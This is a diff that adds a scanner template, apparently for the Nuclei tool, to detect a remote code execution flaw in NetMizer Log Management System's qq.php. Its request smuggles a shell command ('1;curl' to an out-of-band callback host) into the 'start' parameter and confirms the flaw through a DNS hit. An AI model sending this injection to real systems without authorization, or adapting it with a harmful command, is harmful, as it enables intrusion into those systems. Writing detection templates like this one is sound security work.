@@ -1,0 +1,18 @@
+id: netmizer-log-ms-qq-php-rce
+info:
+  name: NetMizer Log Management System qq.php Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,dnslog
+
+http:
+  - raw:
+      - |
+        GET /data/search/qq.php?action=file&start=1;curl+{{interactsh-url}}+%23+ HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
